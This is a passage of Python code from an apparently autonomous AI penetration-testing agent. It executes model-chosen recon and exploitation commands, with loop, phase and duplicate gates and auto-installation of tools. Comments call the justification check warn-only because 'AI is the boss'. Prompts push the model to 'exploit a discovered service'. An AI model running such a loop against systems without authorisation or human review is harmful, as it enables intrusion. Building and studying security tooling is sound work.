                        print(f"{C.G}[run] {command[:100]}{C.N}")
                        gain = self._info_gain_scorer(command)
                        print(f"{C.B}[Gain] {gain}/10 — {'ZERO-GAIN' if gain < 3 else f'GAIN={gain}'}{C.N}")
                        if fallback_result and not fallback_result.ok:
                            print(f"{C.Y}[!] Command failed (rc={fallback_result.returncode}), continuing...{C.N}")
                        last_rc = fallback_result.returncode if fallback_result else -1
                        self._last_reflection = self._self_reflect(command, previous_output, last_rc)
                        if self._last_reflection:
                            print(f"{C.B}[Reflect] {self._last_reflection[:200]}{C.N}")
                        # Give AI a chance to recover every 3 fallback iterations
                        if self._ai_empty_streak >= 5 and self._ai_empty_streak % 3 == 0:
                            self._ai_empty_streak = 0
                            print(f"{C.C}[+] Resetting AI retry counter — will attempt AI recovery next iteration{C.N}")
                    except Exception as e:
                        print(f"{C.R}[!] Fallback exec error: {e}{C.N}")
                        previous_output = f"[SYSTEM: Fallback command error: {e}]"
                    continue

                # Justification gate: warn-only (AI is the boss; we don't block its decisions)
                jpass, jreason = self._justification_gate(reasoning, thinking, command)
                if not jpass:
                    is_no_data = "no real session data" in jreason
                    if is_no_data:
                        print(f"{C.R}[!] JUSTIFICATION REJECTED — {jreason}. Command blocked.{C.N}")
                        self._stuck_warnings.append(f"Justification rejected (no session data): {command[:80]}")
                        previous_output = (f"[SYSTEM: Your command justification does not reference REAL session data. "
                            f"You must cite actual open ports, discovered services, found endpoints, "
                            f"credentials, or subdomains from THIS session. "
                            f"Findings: {self.session.findings_summary()}]")
                        self.session.add_cmd(command, f"[BLOCKED: justification needs real session data]", "blocked", -1)
                        continue
                    print(f"{C.Y}[!] WEAK JUSTIFICATION — {jreason} (warning only, AI is in control){C.N}")
                    self._stuck_warnings.append(f"Weak justification: {command[:80]}")

                # Auth attack safety check (public real-world targets only)
                if self.target_type == "public_real_world":
                    is_auth_attack = any(p.search(command) for p in self.AUTH_ATTACK_PATTERNS)
                    if is_auth_attack:
                        self._auth_attack_blocked += 1
                        print(f"{C.R}[!] AUTH ATTACK BLOCKED — target_type=public_real_world{C.N}")
                        print(f"{C.Y}    Command: {command[:150]}{C.N}")
                        previous_output = "[SYSTEM: Auth attack blocked. Target is public_real_world. Recon/enumeration only — no password attacks, credential stuffing, auth bypass, or hash cracking.]"
                        self.session.add_cmd(command, "[BLOCKED: auth attack on public target]", "blocked")
                        continue

                # Command validation
                is_valid, warning, fixes = self._validate_command(command)
                if not is_valid:
                    print(f"{C.Y}[!] COMMAND VALIDATION: {warning}{C.N}")
                    if fixes:
                        for fx in fixes[:2]:
                            print(f"{C.B}    Fix suggestion: {fx}{C.N}")
                    # Block obviously invalid commands
                    if "not installed" in warning:
                        base = command.strip().split()[0].split("/")[-1]
                        print(f"{C.Y}[!] Auto-installing missing tool: {base}{C.N}")
                        if self._auto_install(base):
                            print(f"{C.G}[+] Tool installed, proceeding...{C.N}")
                        else:
                            print(f"{C.R}[!] Tool '{base}' unavailable — blocking (verify before execute).{C.N}")
                            self._stuck_warnings.append(f"Unavailable tool blocked: {base}")
                            previous_output = (
                                f"[SYSTEM: Tool '{base}' is NOT installed and could not be auto-installed. "
                                f"Do NOT use '{base}'. Use an installed tool (e.g. curl, httpx) or a different technique.]"
                            )
                            self.session.add_cmd(command, f"[BLOCKED: tool '{base}' unavailable]", "blocked", -1)
                            continue
                if warning:
                    print(f"{C.Y}[!] Command warning: {warning[:200]}{C.N}")

                # X19_INTELLIGENCE: self-critique gate — detect when the AI is
                # template-filling (same think text, same generic reasoning,
                # same tool family in a row). Catches the exact loop pattern
                # observed in production runs (AI returning near-identical
                # responses 5+ times in a row without learning).
                critique_ok, critique_reason = self._self_critique_check(decision)
                if not critique_ok:
                    print(f"{C.BOLD}{C.M}[!] SELF-CRITIQUE FAILED — {critique_reason}{C.N}")
                    self._stuck_warnings.append(f"Self-critique: {critique_reason[:80]}")
                    previous_output = f"[SYSTEM: SELF-CRITIQUE FAILED — {critique_reason}]"
                    self.session.add_cmd(command, f"[BLOCKED: self-critique failed]", "blocked", -1)
                    self._consecutive_blocked_cmds += 1
                    if self._consecutive_blocked_cmds >= 3:
                        fb = self._force_next_planner_step()
                        if fb:
                            result = self.exec.run(fb, timeout=60)
                            self._extract_to_model(fb, result)
                            self._register_probe(fb, result)
                            self.session.add_cmd(fb, result.text[:500], "probe", result.returncode)
                            previous_output = result.text[:3000]
                            self._consecutive_blocked_cmds = 0
                            continue
                    continue

                cmd_hash = hash(command)
                cmd_stripped = self._strip_cmd(command)
                cmd_stripped_hash = hash(cmd_stripped)
                is_dup = cmd_hash in self._cmd_hashes or cmd_stripped_hash in self._cmd_hashes_stripped
                self._cmd_hashes.add(cmd_hash)
                self._cmd_hashes_stripped.add(cmd_stripped_hash)

                # Skip tool loop/tool-family checks in fallback mode (AI is broken,
                # we're running deliberate phased pentest commands)
                if self._ai_empty_streak < 2:
                    tool_base = command.strip().split()[0] if command.strip().split() else ""
                    same_tool_recent = sum(1 for c in self._last_commands if c.strip().startswith(tool_base))
                    if same_tool_recent >= 3 and not is_dup:
                        print(f"{C.Y}[!] TOOL LOOP — '{tool_base}' used {same_tool_recent}/5 times. Pivot to a different tool.{C.N}")
                        self._stuck_warnings.append(f"Tool loop: {tool_base} x{same_tool_recent}")
                        previous_output = f"[SYSTEM: You keep using '{tool_base}'. Used {same_tool_recent} of the last 5 times. PICK A DIFFERENT TOOL.]"
                        self.session.add_cmd(command, f"[BLOCKED: tool loop {tool_base}]", "blocked", -1)
                        continue

                    # Tool family fixation check — force diversity across technique categories
                    fam_blocked, fam_msg = self._tool_fixation_check(command)
                    if fam_blocked:
                        print(f"{C.R}[!] {fam_msg}{C.N}")
                        self._stuck_warnings.append(f"Tool family fixation: {fam_msg[:80]}")
                        previous_output = f"[SYSTEM: {fam_msg}]"
                        self.session.add_cmd(command, f"[BLOCKED: tool family fixation]", "blocked", -1)
                        continue

                    # ALREADY EXECUTED tool check — once a tool has been run successfully,
                    # block any attempt to run it again. Prevents subfinder loops.
                    tool_base = command.strip().split()[0] if command.strip().split() else ""
                    if tool_base and self._executed_tool_names:
                        # Match if command starts with any executed tool name
                        already_run = False
                        for et in sorted(self._executed_tool_names, key=len, reverse=True):
                            if tool_base == et or tool_base.startswith(et + "/") or tool_base.startswith(et + "\\"):
                                already_run = True
                                break
                            # Handle paths: /usr/bin/nmap or nmap
                            base_name = os.path.basename(tool_base).split(".exe")[0].split(".py")[0]
                            et_name = os.path.basename(et).split(".exe")[0].split(".py")[0]
                            if base_name and base_name == et_name:
                                already_run = True
                                break
                        if already_run:
                            print(f"{C.R}[!] TOOL ALREADY EXECUTED — '{tool_base}' has been run already. Pivot to a different tool.{C.N}")
                            self._stuck_warnings.append(f"Already executed: {tool_base}")
                            previous_output = (
                                f"[SYSTEM: '{tool_base}' was already executed earlier in this session. "
                                f"Running it again produces no new information. "
                                f"Executed tools: {sorted(self._executed_tool_names)}. "
                                f"PICK A DIFFERENT TOOL YOU HAVEN'T USED YET.]"
                            )
                            self.session.add_cmd(command, f"[BLOCKED: already executed {tool_base}]", "blocked", -1)
                            continue

                # Phase enforcement: tool allowed in phase, max 2 tries per tool
                phase_allowed, phase_reason = self._phase_enforce(command)
                if not phase_allowed:
                    print(f"{C.R}[!] PHASE ENFORCEMENT: {phase_reason}{C.N}")
                    self._stuck_warnings.append(f"Phase: {phase_reason[:80]}")
                    previous_output = f"[SYSTEM: {phase_reason}. Current phase: {self._current_phase.upper()}. Choose a tool allowed in this phase.]"
                    self.session.add_cmd(command, f"[BLOCKED: phase enforcement]", "blocked", -1)
                    continue
                self._phase_attempt_record(command)
                # Check stuck status and potentially ask for hint
                if self._phase_is_stuck() and not self._asked_human_hint:
                    print(f"{C.BOLD}{C.Y}[!] PHASE STUCK — 5+ iterations without advance in {self._current_phase.upper()}{C.N}")
                    print(f"{C.Y}    Next phase requires: {self._phase_advance_needs_text()}{C.N}")
                    previous_output = f"[SYSTEM: You appear stuck in {self._current_phase.upper()} phase. Try a fundamentally different approach or tool you haven't used yet.]"
                    self._asked_human_hint = True

                # Information gain — scored for visibility but NOT blocked.
                # Only exact duplicates and banned categories block commands now.
                gain = self._info_gain_scorer(command)
                if gain < 3:
                    gain_note = " — ZERO-GAIN"
                elif gain < 5:
                    gain_note = " — LOW-GAIN"
                else:
                    gain_note = f" — GAIN={gain}"
                print(f"{C.B}[Gain] {gain}/10{gain_note}{C.N}")

                # Service category tracking
                cat = self._cmd_category(command)
                self._service_iters[cat] = self._service_iters.get(cat, 0) + 1
                self._last_service_category = cat
                self._category_hard_limits[cat] = self._category_hard_limits.get(cat, 0) + 1

                is_file_read = any(cmd in command.split()[0] for cmd in ['head', 'cat', 'wc', 'tail', 'less', 'more']) if command.split() else False
                if is_file_read:
                    self._file_read_streak += 1
                else:
                    self._file_read_streak = 0

                is_grep_file = bool(re.match(r'^(grep|awk|sed)\s', command.strip()))
                if is_grep_file:
                    self._file_read_streak += 1

                self._last_commands.append(command)
                if len(self._last_commands) > 5:
                    self._last_commands = self._last_commands[-5:]

                if self._file_read_streak >= 2:
                    print(f"{C.R}[!] FILE READ LOOP DETECTED — {self._file_read_streak} consecutive file reads. FORCING ACTIVE SCAN.{C.N}")
                    self._stuck_warnings.append(f"File read loop: {self._file_read_streak} reads")
                    previous_output = f"[SYSTEM: STOP READING FILES. You've read {self._file_read_streak} files in a row. START ACTIVE SCANNING NOW. Run httpx, nuclei, or ffuf on discovered subdomains. NO MORE head/cat/wc/tail/grep/awk/sed commands.]"
                    self.session.add_cmd(command, "[BLOCKED: file read loop]", "blocked")
                    self._file_read_streak = 0
                    continue

                # Session memory check: block tool+flag combo that failed in last 3 iterations
                _cmd_sig = self._tool_flag_signature(command)
                if _cmd_sig and not is_dup:
                    _aloop = get_antiloop()
                    if _aloop.is_signature_blocked(_cmd_sig, max_recent=3):
                        print(f"{C.R}[!] SESSION MEMORY — tool+flags '{_cmd_sig}' failed in last 3 iterations. BLOCKED.{C.N}")
                        self._stuck_warnings.append(f"Session memory blocked: {_cmd_sig}")
                        previous_output = (f"[SYSTEM: This exact tool+flag combination ('{_cmd_sig}') failed in the last 3 iterations. "
                            "It is temporarily blocked. Use a DIFFERENT tool, different flags, or a different approach. "
                            "Do NOT retry the same command with the same arguments.]")
                        self.session.add_cmd(command, f"[BLOCKED: session memory - {_cmd_sig}]", "blocked", -1)
                        continue

                # Reset banned-override streak when AI picks a non-banned category
                # (so a single stale override doesn't permanently disable the AI).
                if not hasattr(self, "_banned_override_streak"):
                    self._banned_override_streak = 0
                if cat not in self._banned_categories and cat not in self._banned_plan_categories:
                    if self._banned_override_streak > 0:
                        self._banned_override_streak = max(0, self._banned_override_streak - 1)

                # Loop recovery: a category banned by a prior HARD LOOP must not run again.
                if cat in self._banned_categories or cat in self._banned_plan_categories:
                    print(f"{C.BOLD}{C.R}[!] BANNED CATEGORY '{cat}' — refusing, strategy change required.{C.N}")
                    self._stuck_warnings.append(f"Banned-category blocked: {cat}")
                    banned_all = sorted(set(self._banned_categories) | set(self._banned_plan_categories))
                    # BUGFIX: override with a non-banned command from local fallback instead of looping.
                    # DEDUP: if pick_fallback returns the same override as last iteration, force-rotate
                    # by trying up to 3 more candidates.
                    # AI takeover: after 3 consecutive AI-driven banned-category attempts, skip the AI
                    # for this iteration and use the local fallback directly (the model is stuck).
                    if not hasattr(self, "_banned_override_streak"):
                        self._banned_override_streak = 0
                    self._banned_override_streak += 1
                    banned_set = set(self._banned_categories) | set(self._banned_plan_categories)
                    override = ""
                    if self._banned_override_streak >= 3:
                        # Local takeover: rotate to next candidate without consulting AI again
                        override = self.auto_replanner.pick_fallback(self)
                        self._last_override_cmd = override
                        print(f"{C.G}[+] AI TAKEOVER (x{self._banned_override_streak} banned) → {override!r} "
                              f"(cat={self._cmd_category(override) if override else 'n/a'}){C.N}")
                    else:
                        for _attempt in range(4):
                            override = self.auto_replanner.pick_fallback(self)
                            if not override:
                                break
                            if override == self._last_override_cmd:
                                self._last_override_idx = (self._last_override_idx + 1) % 100
                                continue
                            if self._cmd_category(override) in banned_set:
                                continue
                            break
                    if override and self._cmd_category(override) not in banned_set:
                        self._last_override_cmd = override
                        if self._banned_override_streak < 3:
                            print(f"{C.G}[+] Override → {override!r} (cat={self._cmd_category(override)}){C.N}")
                        command = override
                        cat = self._cmd_category(command)
                        previous_output = (
                            f"[SYSTEM: Your previous command was in BANNED category. "
                            f"Overriding with: {command!r} (category: {cat}). "
                            f"Banned: {banned_all}. Findings: {self.session.findings_summary()}]"
                        )
                    else:
                        previous_output = (
                            f"[SYSTEM: Category '{cat}' is BANNED. Banned: {banned_all}. "
                            f"Pick a DIFFERENT category and a genuinely different command. Findings: {self.session.findings_summary()}]"
                        )
                        self.session.add_cmd(command, f"[BLOCKED: banned category {cat}]", "blocked", -1)
                        continue

                # Hard category limit enforcement — force pivot after N in same category.
                # Configurable via X19_CATEGORY_HARD_LIMIT (default 5 was too aggressive
                # for a real engagement — most bugs need >5 web probes in a row).
                _hard_limit = int(os.getenv("X19_CATEGORY_HARD_LIMIT", "20"))
                is_recon_cat = cat in self.RECON_CATS
                hard_limit_reached = self._category_hard_limits.get(cat, 0) >= _hard_limit
                if hard_limit_reached and not is_dup:
                    print(f"{C.R}[!] HARD LIMIT — category '{cat}' exhausted ({self._category_hard_limits[cat]} cmds). Forced pivot.{C.N}")
                    self._stuck_warnings.append(f"Hard limit: {cat} exhausted")
                    previous_output = f"[SYSTEM: HARD LIMIT REACHED. You have run {self._category_hard_limits[cat]} '{cat}' commands. This category is now BLOCKED. You MUST exploit a discovered service or test for web vulnerabilities NOW. Findings so far: {self.session.findings_summary()}]"
                    self.session.add_cmd(command, f"[BLOCKED: hard limit on {cat}]", "blocked", -1)
                    # Mark as handled without executing
                    result = ToolResult("", "blocked", -1, "blocked")
                    is_hard_blocked = True
                else:
                    is_hard_blocked = False

                # Forced exploit mode — only block RECON categories that are truly saturated/exhausted.
                # Targeted recon for exploitation (probing endpoints, checking auth) is still allowed.
                depth_satisfied = self._exploit_depth >= self._depth_minimum
                if self._forced_exploit and is_recon_cat and not is_dup and not is_hard_blocked:
                    if depth_satisfied and self._recon_no_progress_count < 2:
                        self._forced_exploit = False
                        self._current_focus_finding = None
                        self._exploit_depth = 0
                        print(f"{C.G}[+] EXPLOIT DEPTH SATISFIED — recon unfrozen.{C.N}")
                    elif cat in self._exhausted_techniques:
                        print(f"{C.R}[!] FORCED EXPLOIT MODE — '{cat}' exhausted. Must run exploitation commands.{C.N}")
                        previous_output = f"[SYSTEM: FORCED EXPLOIT MODE. '{cat}' category is exhausted. Run exploitation commands. Findings: {self.session.findings_summary()}]"
                        self.session.add_cmd(command, "[BLOCKED: forced exploit mode]", "blocked", -1)
                        result = ToolResult("", "blocked", -1, "blocked")
                        is_hard_blocked = True

                # Failure backoff: a command signature that keeps failing is temporarily
                # blocked (exponential backoff). Don't burn iterations re-running it.
                if not is_dup and not is_hard_blocked:
                    fm_blocked, fm_snip = self.failure_memory.is_blocked(command)
                    if fm_blocked:
                        print(f"{C.Y}[!] FAILURE BACKOFF — command failed repeatedly, temporarily blocked. Pivot.{C.N}")
                        self._stuck_warnings.append(f"Failure-backoff blocked: {command[:100]}")
                        previous_output = (f"[SYSTEM: This command is on FAILURE BACKOFF — it failed repeatedly "
                            f"(last error: {fm_snip}). Temporarily blocked. Use a DIFFERENT command or technique.]")
                        self.session.add_cmd(command, "[BLOCKED: failure backoff]", "blocked", -1)
                        continue

                # Dead-endpoint guard: don't re-probe a path already known 404/403/redirect/soft-404.
                if not is_dup and not is_hard_blocked:
                    skip = self._recon_blocked(command)
                    if skip:
                        print(f"{C.Y}[!] DEAD ENDPOINT — {skip}{C.N}")
                        self._stuck_warnings.append(f"Dead-endpoint re-probe blocked: {command[:80]}")
                        previous_output = (f"[SYSTEM: SKIPPED — {skip} Stop re-checking generic/known-dead paths. "
                            f"Prioritize the RANKED ENDPOINTS and act on the HYPOTHESES in context.]")
                        self.session.add_cmd(command, "[BLOCKED: dead endpoint]", "blocked", -1)
                        continue
                    if cat in self._dead_branches and not self._forced_exploit:
                        print(f"{C.Y}[!] DEAD BRANCH '{cat}' — 3 unproductive runs. Pivot.{C.N}")
                        self._stuck_warnings.append(f"Dead-branch blocked: {cat}")
                        previous_output = (f"[SYSTEM: Category '{cat}' is a DEAD BRANCH (3 runs, no new assets/findings). "
                            f"Switch to a different technique. Dead branches: {sorted(self._dead_branches)}.]")
                        self.session.add_cmd(command, f"[BLOCKED: dead branch {cat}]", "blocked", -1)
                        continue

                if is_dup:
                    print(f"{C.Y}[!] DUPLICATE COMMAND — blocked. Pivot.{C.N}")
                    self._stuck_warnings.append(f"Duplicate command blocked: {command[:120]}")
                    previous_output = f"[SYSTEM: Blocked duplicate command. You already ran this. Pivot to something fundamentally different.]"
                elif not is_hard_blocked and len(parallel_commands) >= 2:
                    # === AI MULTI-COMMAND: execute ALL in parallel ===
                    model_size_before = self._model_size()
                    print(f"{C.BOLD}{C.M}[PARALLEL] Executing {len(parallel_commands)} AI-selected commands...{C.N}")
                    t0 = time.time()
                    from concurrent.futures import ThreadPoolExecutor, as_completed
                    parallel_results = []
                    with ThreadPoolExecutor(max_workers=min(8, len(parallel_commands))) as pool:
                        futures = {}
                        for pc in parallel_commands:
                            if pc.strip():
                                to = self._estimate_timeout(pc)
                                futures[pool.submit(self.exec.run, pc, timeout=to)] = pc
                        for fut in as_completed(futures, timeout=300):
                            pc = futures[fut]
                            try:
                                r = fut.result()
                                parallel_results.append((pc, r))
                                if r and r.text:
                                    self._extract_to_model(pc, r)
                                    self._register_probe(pc, r)
                                    self.session.add_cmd(pc, r.text[:500], self._cmd_category(pc), r.returncode)
                                    print(f"{C.D}[para] {pc[:100]} -> exit {r.returncode}, {len(r.text)}b{C.N}")
                                else:
                                    self.session.add_cmd(pc, "[no output]", self._cmd_category(pc), -1)
                            except Exception as e:
                                log(f"[para] {pc[:60]}: {e}")
                                parallel_results.append((pc, ToolResult("", str(e), -1)))
                    elapsed = time.time() - t0
                    ok = sum(1 for _, r in parallel_results if r and r.ok)
                    print(f"{C.G}[PARALLEL] AI batch done: {ok}/{len(parallel_results)} in {elapsed:.1f}s{C.N}")
                    # Combine outputs for next iteration
                    combined = []
                    for pc, r in parallel_results:
                        if r and r.text:
                            combined.append(f"$ {pc}\n{r.text[:600]}")
                    previous_output = "\n\n".join(combined)[:5000] if combined else ""
                    # Track tool families and executed tool names
                    for pc, _ in parallel_results:
                        self._record_tool_family(pc)
                        pc_base = pc.strip().split()[0] if pc.strip().split() else ""
                        if pc_base:
                            self._executed_tool_names.add(pc_base)
                    self._consecutive_blocked_plans = 0
                    self._consecutive_blocked_cmds = 0
                    # Reflect on combined results
                    if parallel_results:
                        main_result = parallel_results[0][1] if parallel_results[-1][1] else ToolResult("", "", 0)
                        psize_after = self._model_size()
                        self.mission_manager.record_outcome(
                            parallel_commands[0], main_result,
                            model_size_before, psize_after,
                            self._cmd_category(parallel_commands[0]), active_node,
                            task=mission_task,
                            is_plan=True,
                        )
                    self._ai_empty_streak = 0
                elif not is_hard_blocked:
                    if self._banned_categories:
                        # Require 3 consecutive successful non-banned commands before lifting bans
                        self._good_run_count = getattr(self, '_good_run_count', 0) + 1
                        if self._good_run_count >= 3:
                            print(f"{C.G}[+] {self._good_run_count} good commands — lifting bans.{C.N}")
                            self._banned_categories.clear()
                            self._banned_plan_categories.clear()
                            self._good_run_count = 0
                    else:
                        self._good_run_count = 0
                    model_size_before = self._model_size()
                    timeout = self._estimate_timeout(command)
                    result = self.exec.run(command, timeout=timeout)
                    self._record_tool_family(command)
                    tool_base = command.strip().split()[0] if command.strip().split() else ""
                    if tool_base:
                        self._executed_tool_names.add(tool_base)
                    self._consecutive_blocked_plans = 0
                    self._consecutive_blocked_cmds = 0
                    previous_output = result.text[:3000]

                    # X19_INTELLIGENCE: semantic analysis of the output so the AI
                    # understands WHAT happened (not just hashes the bytes). The
                    # structured summary is injected into the next context build.
                    try:
                        self._semantic_output_analysis(command, result, previous_output)
                    except Exception as _sa_err:
                        log(f"[Intel] semantic analysis failed: {_sa_err}")

                    # Retry/fix loop on failure
                    if not result.ok and result.returncode != 0:
                        fixed_cmd, retry_result = self._retry_fix(command, result)
                        if retry_result and retry_result != result:
                            print(f"{C.G}[+] Retry succeeded after fix{C.N}")
                            result = retry_result
                            previous_output = result.text[:3000]
                        else:
                            print(f"{C.Y}[!] Command failed, continuing...{C.N}")

                    self.session.add_cmd(command, result.text[:500], cat, result.returncode)
                    # Self-heal: a storm of HTTP 000 / connection-refused means a LOCAL
                    # connectivity problem (dead proxy env), NOT the target's WAF.
                    if self._detect_conn_failure(command, result):
                        self._conn_fail_streak += 1
                        if self._conn_fail_streak >= 3:
                            healed = self._heal_connectivity()
                            previous_output = ("[SYSTEM: Multiple commands returned HTTP 000 / connection-refused. "
                                "This is a LOCAL connectivity problem on YOUR side, NOT the target's WAF. "
                                + (f"Cleared proxy env ({healed}) — " if healed else "")
                                + "retry WITHOUT proxy (curl --noproxy '*') and confirm the host resolves. Do NOT conclude the target is blocked.]")
                            print(f"{C.BOLD}{C.R}[!] CONNECTION-FAILURE STORM — self-healing ({healed or 'no proxy env'}){C.N}")
                            self._stuck_warnings.append("Connection-failure storm — proxy env cleared")
                            self._conn_fail_streak = 0
                    else:
                        self._conn_fail_streak = 0
                    # Track output hash for stuck detection
                    self._output_hashes.append(hash(previous_output[:500]))
                    if len(self._output_hashes) > 10:
                        self._output_hashes = self._output_hashes[-10:]

                # Self-reflection on last command
                last_rc = result.returncode if not is_dup else 0
                self._last_reflection = self._self_reflect(command, previous_output, last_rc)
                if self._last_reflection:
                    print(f"{C.B}[Reflect] {self._last_reflection[:200]}{C.N}")

                # Exploit-depth tracking: increment depth when exploitation commands run while focused
                if self._current_focus_finding and not is_dup and not is_hard_blocked:
                    self._exploit_depth += 1
                    if self._exploit_depth >= self._depth_minimum:
                        pass

                # Research log entry for this iteration
                productive = False
                if not is_dup:
                    hypothesis = f"Category: {cat} | Command: {command[:100]}"
                    had_error = result.returncode != 0 if not is_hard_blocked else True
                    res_status = "error" if had_error else ("empty" if not result.text.strip() else "completed")
                    lesson = ""
                    if had_error:
                        lesson = f"tool/infrastructure issue — {cat} tool produced error"
                    elif not is_hard_blocked:
                        lesson = f"{'productive' if productive else 'no new information'} — {'learned new' if productive else 'avoid similar'} {cat} commands"
                    else:
                        lesson = f"blocked — avoid similar {cat} commands next time"
                    self._research_log.append({
                        "hypothesis": hypothesis,
                        "result": res_status,
                        "lesson": lesson,
                    })
                    if len(self._research_log) > 20:
                        self._research_log = self._research_log[-20:]

                # Post-execution analysis (only for actual executions, not dups/blocks)
                if not is_dup and not is_hard_blocked:
                    # Extract all discovered data into the persistent TargetModel
                    self._size_before_extraction = self._model_size()
                    self._extract_to_model(command, result)
                    self._register_probe(command, result)
                    self._track_cloudflare(result)
                    self._track_vector(command, result)
                    self._size_after_extraction = self._model_size()
                    # Branch exhaustion + empty/failed-tool detection (productive = new assets/findings)
                    productive = self._size_after_extraction > self._size_before_extraction
                    self._branch_update(cat, productive)
                    self._record_tool_effect(command, productive and not self._tool_failed(result))

                    # Per-tool zero-gain tracking — force category/tool change after 2 consecutive zero-gain
                    base_tool_name = command.split()[0] if command.split() else ""
                    if base_tool_name and not productive:
                        self._tool_zero_gain_streak[base_tool_name] = self._tool_zero_gain_streak.get(base_tool_name, 0) + 1
                        if self._tool_zero_gain_streak[base_tool_name] >= 2:
                            print(f"{C.R}[!] ZERO-GAIN x{self._tool_zero_gain_streak[base_tool_name]} for tool '{base_tool_name}' — forcing category change.{C.N}")
                            self._stuck_warnings.append(f"Zero-gain x{self._tool_zero_gain_streak[base_tool_name]} for {base_tool_name}")
                            # Ban the tool's category so the agent picks a fundamentally different approach
                            if cat and cat != "other" and cat not in self._banned_categories:
                                self._banned_categories.add(cat)
                                print(f"{C.R}[!] Category '{cat}' banned due to zero-gain streak for '{base_tool_name}'{C.N}")
                            # Also ban the tool itself to prevent it from being reused
                            self._broken_tools.add(base_tool_name)
                            self._tool_zero_gain_streak[base_tool_name] = 0
                    elif base_tool_name and productive:
                        self._tool_zero_gain_streak[base_tool_name] = 0

                    failed = self._tool_failed(result)
                    error_type = None
                    stderr_lower = (result.stderr or "").lower()
                    if failed:
                        base_tool = command.split()[0] if command.split() else command
                        fail_key = f"{base_tool}:{failed}"
                        self._tool_failure_counts[fail_key] = self._tool_failure_counts.get(fail_key, 0) + 1
                        if self._tool_failure_counts[fail_key] >= 3:
                            self._broken_tools.add(base_tool)
                        self._record_session_outcome("command", cat, command, "tool_failed", failed)

                        # Classify error type for consecutive-failure detection
                        if result.error == "timeout" or "timeout" in stderr_lower or "timed out" in stderr_lower:
                            error_type = "timeout"
                        elif "invalid option" in stderr_lower or "unrecognized" in stderr_lower:
                            error_type = "bad_flag"
                        else:
                            error_type = "non_zero_exit"

                        # --- AntiLoopEngine failure tracking ---
                        _aloop = get_antiloop()
                        _aloop.record_tool_failure(base_tool, error_type)

                        # --- Record this tool+flag signature as failed ---
                        sig = self._tool_flag_signature(command)
                        if sig:
                            _aloop.record_failed_signature(sig)

                        # --- Mid-session self-improvement trigger ---
                        _SELF_IMPROVE_TOOL_BLACKLIST = {"python", "python3", "sh", "bash", "echo", "printf"}
                        if base_tool not in _SELF_IMPROVE_TOOL_BLACKLIST:
                            if _aloop.has_consecutive_same_error(base_tool, error_type, threshold=2):
                                print(f"{C.BOLD}{C.M}[SELF-IMPROVE] {base_tool} failed 2x consecutively with '{error_type}' — diagnosing...{C.N}")
                                patch_result = mid_session_self_improve(self, base_tool, error_type, result.stderr or "")
                                if patch_result and patch_result.success:
                                    print(f"{C.G}[+] Self-improvement patch applied for {base_tool}{C.N}")
                                elif patch_result and not patch_result.success:
                                    print(f"{C.Y}[-] Self-improvement diagnosis found no actionable fix for {base_tool}{C.N}")

                        self._last_reflection = (self._last_reflection + " | " if self._last_reflection else "") \
                            + f"TOOL FAILED ({failed}) — output is NOT evidence. Fix/replace the tool, do not build on this."
                    elif self._is_empty_result(result):
                        self._record_session_outcome("command", cat, command, "empty", "command returned nothing")
                        base_tool = command.split()[0] if command.split() else command
                        _aloop = get_antiloop()
                        _aloop.record_tool_failure(base_tool, "empty_output")
                        sig = self._tool_flag_signature(command)
                        if sig:
                            _aloop.record_failed_signature(sig)
                        if base_tool not in ("python", "python3", "sh", "bash", "echo", "printf"):
                            if _aloop.has_consecutive_same_error(base_tool, "empty_output", threshold=2):
                                print(f"{C.BOLD}{C.M}[SELF-IMPROVE] {base_tool} returned empty 2x consecutively — diagnosing...{C.N}")
                                patch_result = mid_session_self_improve(self, base_tool, "empty_output", result.stderr or "")
                                if patch_result and patch_result.success:
                                    print(f"{C.G}[+] Self-improvement patch applied for {base_tool}{C.N}")
                        self._last_reflection = (self._last_reflection + " | " if self._last_reflection else "") \
                            + "EMPTY RESULT — command returned nothing. This is NOT a finding; pivot, don't re-run."
                    else:
                        self._record_session_outcome("command", cat, command, "success", f"output {len(result.text)} chars")
                        quality = self._output_quality(result)
                        if quality == "weak":
                            self._last_reflection = (self._last_reflection + " | " if self._last_reflection else "") \
                                + "WEAK OUTPUT — tool returned very little data. Consider a more powerful/reliable tool."
                        elif quality == "error" and result.returncode == 0:
                            self._last_reflection = (self._last_reflection + " | " if self._last_reflection else "") \
                                + "OUTPUT CONTAINS ERROR MESSAGES — verify this tool actually works correctly."
                    self.session.set_ports(", ".join(
                        p.get("key", f"{p['port']}/{p['proto']}") for p in self.model.ports[:20]
                    ))
                    if self.model.os_info:
                        self.session.set_os(self.model.os_info)
                    self.mission_manager.record_outcome(
                        command,
                        result,
                        model_size_before,
                        self._model_size(),
                        cat,
                        active_node,
                        task=mission_task,
                        is_plan=False,
                    )
                    self._queue_autonomy_tasks(active_node, f"post-command update for {cat}")

                    # Technique extraction for memory
                    tech = self._extract_technique_from_output(command, result.stdout or "")
                    if tech:
                        self.memory.add("techniques", tech, {
                            "target": self.target, "type": self.target_type,
                            "command": command[:200], "category": cat,
                            "date": datetime.now().strftime("%Y-%m-%d"), "timestamp": time.time(),
                            "success": result.ok,
                        })

                    # CTF flag auto-detection
                    if is_ctf_mode() and result.stdout:
                        flag_match = re.search(r'(flag\{[^}]+\}|CTF\{[^}]+\}|[Ff][Ll][Aa][Gg]\s*[=:]\s*\S+)', result.stdout)
                        if flag_match:
                            flag = flag_match.group(1)
                            print(f"{C.BOLD}{C.G}[CTF] FLAG FOUND: {flag}{C.N}")
                            print(f"{C.G}[CTF] Command: {command[:120]}{C.N}")
                            has_flag = any("flag" in f.title.lower() for f in self.model.findings)
                            if not has_flag:
                                f = Finding(
                                    severity="critical",
                                    title=f"CTF Flag: {flag[:80]}",
                                    description=f"Flag captured via: {command[:200]}",
                                    evidence=flag,
                                )
                                self.model.add_finding(f)
                                self.session.add_finding(f.severity, f.title, f.description, f.evidence)
                                self._found_high_this_session = True
                                print(f"{C.G}[+] CTF flag recorded as critical finding{C.N}")

                    # --- Subdomain tracking & diminishing returns detection ---
                    before = len(self.model.subdomains)
                    new_count = 0
                    if cat == "subdomain_recon" and result.stdout:
                        found = set(re.findall(
                            r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.){2,}[a-zA-Z]{2,}\b',
                            result.stdout
                        ))
                        found = {s for s in found if s.count('.') >= 2 and not s.startswith('http')}
                        for s in found:
                            self.model.add_subdomain(s)
                        after = len(self.model.subdomains)
                        new_count = after - before
                        print(f"{C.B}[Subs] {new_count} new (total: {after}){C.N}")

                    # Normalized-script counter — tracks how many times the same
                    # structural command (modulo comments/whitespace) has been tried.
